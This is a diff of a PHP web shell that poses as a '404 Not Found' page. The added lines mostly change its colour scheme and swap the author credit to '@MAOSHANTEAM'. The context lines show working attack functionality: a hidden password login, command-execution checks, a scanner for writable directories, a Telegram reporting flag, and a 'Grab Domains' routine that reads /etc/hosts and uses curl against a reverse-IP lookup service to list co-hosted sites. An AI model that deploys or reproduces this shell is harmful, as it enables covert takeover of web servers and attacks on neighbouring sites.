@@ -34,7 +34,7 @@ if (!isset($_SESSION["telegram_reported"])) {
 }
 if(!isset($_COOKIE['_k'])){
     if(isset($_POST['_k'])&&$_POST['_k']===$k){setcookie('_k',$k,time()+86400,'/');header('Location:'.$_SERVER['REQUEST_URI']);exit;}
-    echo '<html><head><title>404 Not Found</title><style>*{margin:0;padding:0;font-family:monospace}body{background:#0f172a;display:flex;justify-content:center;align-items:center;height:100vh}.x{background:#1e293b;padding:30px;border-radius:8px}input{background:#0f172a;border:1px solid #334155;color:#fff;padding:8px 12px;border-radius:4px;font-family:monospace}button{background:#e94560;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:monospace;margin-left:5px}</style></head><body><div class="x"><form method="post"><input type="password" name="_k" placeholder="key" autofocus><button>Go</button></form></div></body></html>';exit;
+    echo '<html><head><title>404 Not Found</title><style>*{margin:0;padding:0;font-family:monospace}body{background:#2a0f0f;display:flex;justify-content:center;align-items:center;height:100vh}.x{background:#ffffff;padding:30px;border-radius:8px}input{background:#2a0f0f;border:1px solid #553333;color:#fff;padding:8px 12px;border-radius:4px;font-family:monospace}button{background:#ff0000;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:monospace;margin-left:5px}</style></head><body><div class="x"><form method="post"><input type="password" name="_k" placeholder="key" autofocus><button>Go</button></form></div></body></html>';exit;
 }elseif($_COOKIE['_k']!==$k){setcookie('_k','',0,'/');echo'404';exit;}
 
 // Decode base64 wrapper
@@ -180,18 +180,18 @@ $_hascmd=function_exists('system')||function_exists('exec')||function_exists('sh
 <html><head><title>404 Not Found</title><meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:monospace;font-size:13px}
-body{background:#0f172a;color:#e2e8f0}a{color:#38bdf8;text-decoration:none}
+body{background:#2a0f0f;color:#e2e8f0}a{color:#38bdf8;text-decoration:none}
 .w{max-width:1200px;margin:0 auto;padding:10px}
-.b{background:#1e293b;padding:8px 12px;border-radius:6px;margin-bottom:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
-input[type=text],input[type=file],select{background:#0f172a;border:1px solid #334155;color:#fff;padding:5px 8px;border-radius:4px;font-family:monospace;font-size:13px}
-button,input[type=submit]{background:#e94560;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:13px}
+.b{background:#ffffff;padding:8px 12px;border-radius:6px;margin-bottom:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+input[type=text],input[type=file],select{background:#2a0f0f;border:1px solid #553333;color:#fff;padding:5px 8px;border-radius:4px;font-family:monospace;font-size:13px}
+button,input[type=submit]{background:#ff0000;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:13px}
 button:hover{background:#ff6b81}
-table{width:100%;border-collapse:collapse}th{background:#1e293b;padding:6px 10px;text-align:left;border-bottom:2px solid #e94560}
-td{padding:4px 10px;border-bottom:1px solid #1e293b}tr:hover{background:#1e293b}
-.s{color:#64748b}.m{background:#0a3d62;padding:8px;border-radius:4px;margin-bottom:8px;color:#7bed9f}
-textarea{width:100%;height:400px;background:#0f172a;color:#e2e8f0;border:1px solid #334155;padding:8px;font-family:monospace;border-radius:4px}
-.ab{background:#334155;border:none;cursor:pointer;padding:3px 8px;border-radius:3px;font-size:12px;color:#e2e8f0;font-family:monospace}
-.ab:hover{background:#e94560;color:#fff}
+table{width:100%;border-collapse:collapse}th{background:#ffffff;padding:6px 10px;text-align:left;border-bottom:2px solid #ff0000}
+td{padding:4px 10px;border-bottom:1px solid #ffffff}tr:hover{background:#ffffff}
+.s{color:#ffffff}.m{background:#0a3d62;padding:8px;border-radius:4px;margin-bottom:8px;color:#0dff00}
+textarea{width:100%;height:400px;background:#2a0f0f;color:#e2e8f0;border:1px solid #553333;padding:8px;font-family:monospace;border-radius:4px}
+.ab{background:#553333;border:none;cursor:pointer;padding:3px 8px;border-radius:3px;font-size:12px;color:#e2e8f0;font-family:monospace}
+.ab:hover{background:#ff0000;color:#fff}
 .prog{display:none;color:#38bdf8;font-size:11px}
 </style>
 <script>
@@ -303,7 +303,7 @@ function navDir(dir){
 </script></head>
 <body><div class="w">
 <div class="b">
-    <b style="color:#e94560">FM</b>
+    <b style="color:#ff0000">FM</b>
     <form method="post" onsubmit="document.getElementById('_pb').value=btoa(document.getElementById('_pv').value);return true;" style="display:flex;gap:5px;flex:1">
         <input type="text" id="_pv" value="<?=htmlspecialchars($dir)?>" style="flex:1;min-width:200px;color:<?=$_dirwr?'#22c55e':'#ef4444'?>;font-weight:bold">
         <input type="hidden" name="_pb" id="_pb">
@@ -320,7 +320,7 @@ function navDir(dir){
     <button onclick="doScanWr()" style="background:#10b981">Scan</button>
 </div>
 <?php if(isset($msg)):?><div class="m"><?=$msg?></div><?php endif;?>
-<div class="b" style="color:#64748b;font-size:11px">
+<div class="b" style="color:#ffffff;font-size:11px">
     <?=$_user?> | <span style="color:<?=$_dirwr?'#22c55e':'#ef4444'?>;font-weight:bold"><?=$_dirwr?'WRITABLE':'READ-ONLY'?></span> | PHP <?=phpversion()?> | <?=$_hascmd?'CMD:ON':'CMD:OFF'?>
 </div>
 
@@ -337,8 +337,8 @@ $_wr_dirs=array_filter(array_map('trim',explode("\n",$_wr_out)));
 <div style="background:#0a1a0a;border:1px solid #10b981;border-radius:4px;padding:8px;margin-bottom:8px">
 <div style="color:#10b981;font-size:11px;margin-bottom:6px"><b><?=count($_wr_dirs)?> writable dirs</b> in <?=htmlspecialchars($_sp)?></div>
 <?php if($_wr_dirs):foreach($_wr_dirs as $_wd){$_wpm=@substr(sprintf('%o',fileperms($_wd)),-4);$_wow=function_exists('posix_getpwuid')?@posix_getpwuid(fileowner($_wd))['name']:fileowner($_wd);$_wgr=function_exists('posix_getgrgid')?@posix_getgrgid(filegroup($_wd))['name']:filegroup($_wd);
-echo "<div style='padding:2px 0'><a href=\"javascript:navDir('"._e($_wd)."')\" style='color:#22c55e;font-size:12px'>&#128193; ".htmlspecialchars($_wd)."</a> <span style='color:#64748b;font-size:11px'>$_wow:$_wgr $_wpm</span></div>";}
-else:?><div style="color:#64748b">No writable dirs found</div><?php endif;?>
+echo "<div style='padding:2px 0'><a href=\"javascript:navDir('"._e($_wd)."')\" style='color:#22c55e;font-size:12px'>&#128193; ".htmlspecialchars($_wd)."</a> <span style='color:#ffffff;font-size:11px'>$_wow:$_wgr $_wpm</span></div>";}
+else:?><div style="color:#ffffff">No writable dirs found</div><?php endif;?>
 </div>
 
 <?php endif;?>
@@ -368,7 +368,7 @@ $_hf=@file_get_contents('/etc/hosts');if($_hf&&preg_match_all('/^[\d\.]+\s+(.+)$
 $apiOk=false;if($extip&&filter_var(trim($extip),FILTER_VALIDATE_IP)){$_ar=trim(_xcmd("curl -s --max-time 10 'https://api.hackertarget.com/reverseiplookup/?q=$extip' 2>/dev/null"));if($_ar&&strpos($_ar,'error')===false&&strpos($_ar,'API count')===false&&strpos($_ar,'No DNS')===false){$apiOk=true;foreach(explode("\n",$_ar) as $_d)if(($__d=trim($_d))&&preg_match('/^[\w\.\-]+\.\w{2,}$/',$__d)&&!isset($doms[strtolower($__d)]))$doms[strtolower($__d)]=['s'=>'ReverseIP','p'=>''];}}
 ksort($doms);$np=0;foreach($doms as $_di)if(!empty($_di['p'])&&@is_dir($_di['p']))$np++;
 ?>
-<div class="b" style="justify-content:space-between"><b style="color:#e94560">Grab Domains</b> <span class="s">LAN: <?=htmlspecialchars($sip)?> | WAN: <?=htmlspecialchars($extip)?></span> <button onclick="navDir('<?=_e($dir)?>')" class="ab" style="background:#0a84ff;color:#fff">&larr; Back</button></div>
+<div class="b" style="justify-content:space-between"><b style="color:#ff0000">Grab Domains</b> <span class="s">LAN: <?=htmlspecialchars($sip)?> | WAN: <?=htmlspecialchars($extip)?></span> <button onclick="navDir('<?=_e($dir)?>')" class="ab" style="background:#0a84ff;color:#fff">&larr; Back</button></div>
 <?php if(!empty($doms)):?>
 <div class="m">Found <?=count($doms)?> entries | <?=$np?> browsable <?=$apiOk?'':'| ReverseIP API timeout'?></div>
 <table><tr><th>#</th><th>Domain</th><th>Document Root</th><th>Source</th></tr>
@@ -441,5 +441,5 @@ if(preg_match('/\.(zip|tar\.gz|tgz|tar|gz|rar)$/i',$it))echo " <button class='ab
 echo "</td></tr>";}}?>
 </table>
 <?php endif;?>
-<div style="text-align:center;padding:15px 0;font-size:12px;margin-top:10px;border-top:1px solid #1e293b"><span style="color:#e2e8f0">m0naliza</span> <span style="color:#e94560">&#10084;</span></div>
+<div style="text-align:center;padding:15px 0;font-size:12px;margin-top:10px;border-top:1px solid #ffffff"><span style="color:#e2e8f0">@MAOSHANTEAM</span> <span style="color:#ff0000">&#10084;</span></div>
 </div></body></html>
